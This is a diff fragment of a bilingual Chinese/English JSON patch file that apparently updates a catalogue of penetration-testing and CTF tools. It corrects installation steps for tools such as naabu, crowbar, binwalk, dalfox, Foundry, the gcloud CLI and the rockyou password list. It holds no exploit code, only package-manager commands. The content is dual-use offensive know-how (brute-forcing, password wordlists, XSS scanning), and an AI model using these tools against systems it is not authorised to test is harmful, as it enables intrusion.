+      "en": "SAML Binding Encodings (POST and Redirect)"
+     }
+    }
+   ]
+  },
+  {
+   "id": "oauth-oidc-attacks",
+   "patches": [
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "授权端点重复请求观测",
+      "en": "Authorization Endpoint Replay Observation"
+     }
+    }
+   ]
+  },
+  {
+   "id": "active-recon-tools",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "Go 工具链安装：go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest；同卡还用到 dnsx、tlsx、assetfinder，分别用各自的 Go 模块路径以 go install 安装。",
+      "en": "All four tools install with the Go toolchain from their own ProjectDiscovery module paths, for example naabu: go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
+     }
+    }
+   ]
+  },
+  {
+   "id": "binwalk",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "Kali/Debian：apt install binwalk（传统 v2）。binwalk v3 为 Rust 重写：从 ReFirmLabs 官方仓库获取源码后 cargo build --release，或下载官方发行版二进制；pip install binwalk 装的是过时的 Python v2。",
+      "en": "On Kali/Debian run apt install binwalk for the legacy v2. binwalk v3 is a Rust rewrite: build from the official ReFirmLabs source with cargo build --release or download a release binary; pip install binwalk only provides the outdated Python v2."
+     }
+    }
+   ]
+  },
+  {
+   "id": "crowbar",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "Kali：apt install crowbar；通用环境从 galkan/crowbar 官方仓库 git clone 后 pip install -r requirements.txt；PyPI 不存在 crowbar 包。",
+      "en": "On Kali run apt install crowbar. On other systems clone the galkan/crowbar project and run pip install -r requirements.txt; no crowbar package exists on PyPI."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ctf-blockchain",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "Foundry（forge 套件）：安装其官方安装脚本后执行 foundryup；Python 侧 pip install slither-analyzer mythril web3；truffle 已停止维护，不再推荐。",
+      "en": "Install Foundry (forge and related tools) with its official installer script followed by foundryup; Python tooling via pip install slither-analyzer mythril web3. Truffle is unmaintained and no longer recommended."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ctf-forensics-tools",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "apt install foremost testdisk autopsy volatility3 sleuthkit scalpel oletools；olevba 也可通过 pip install oletools 获取。",
+      "en": "Run apt install foremost testdisk autopsy volatility3 sleuthkit scalpel oletools; the olevba tool can also be obtained with pip install oletools."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ctf-misc-tools",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "pip install qrcode pyzbar pillow pydub；再补系统工具：apt install zbar-tools fcrackzip exiftool。",
+      "en": "Run pip install qrcode pyzbar pillow pydub, then add the system tools with apt install zbar-tools fcrackzip exiftool."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ecc-lattice-attacks",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "pip install pycryptodome；SageMath 用系统包管理器安装（apt install sagemath）或走 conda-forge；PyPI 的 sage 是无关同名包，装不了 SageMath。",
+      "en": "Install pycryptodome with pip; get SageMath from the system package manager (apt install sagemath) or from conda-forge; the PyPI package named sage is an unrelated project and cannot install SageMath."
+     }
+    }
+   ]
+  },
+  {
+   "id": "cloud-gcp-pentest",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "gcloud CLI 走官方渠道：官方安装脚本（sdk.cloud.google.com）或配置 Google 官方 apt 仓库后 apt install google-cloud-cli；PyPI 的 gcloud 是无关旧包，不是 Google Cloud SDK。",
+      "en": "Install the gcloud CLI from official channels: the installer script at sdk.cloud.google.com or the Google apt repository followed by apt install google-cloud-cli; the PyPI package named gcloud is an unrelated legacy project, not the Google Cloud SDK."
+     }
+    }
+   ]
+  },
+  {
+   "id": "rockyou",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "Kali 自带：/usr/share/wordlists/rockyou.txt.gz（需 gunzip 解压）；其他环境从 SecLists 或 kaonashi 密码字典集合下载 rockyou.txt。",
+      "en": "Kali ships it at /usr/share/wordlists/rockyou.txt.gz (decompress with gunzip); on other systems download rockyou.txt from the SecLists or kaonashi password-list collections."
+     }
+    }
+   ]
+  },
+  {
+   "id": "dalfox",
+   "patches": [
+    {
+     "path": "description",
+     "value": {
+      "zh": "基于 Go 的 XSS 扫描与参数分析工具，支持单 URL、文件或管道输入、自定义 Payload、结构化输出、WAF 识别和盲打 XSS 回连验证。",
+      "en": "Go-based XSS scanner and parameter analysis tool supporting single URL, file, or pipe input, custom payloads, structured output, WAF detection, and blind XSS callbacks."
+     }
+    },
+    {
+     "path": "installation",
+     "value": {
+      "zh": "go install github.com/hahwul/dalfox/v3@latest（v3 提供 scan 子命令；v2 模块装出的是 url/file/pipe 旧 CLI）",
+      "en": "go install github.com/hahwul/dalfox/v3@latest (v3 provides the scan subcommand; the v2 module installs the legacy url/file/pipe CLI)."
+     }
+    }
+   ]
+  }
+ ]
+}
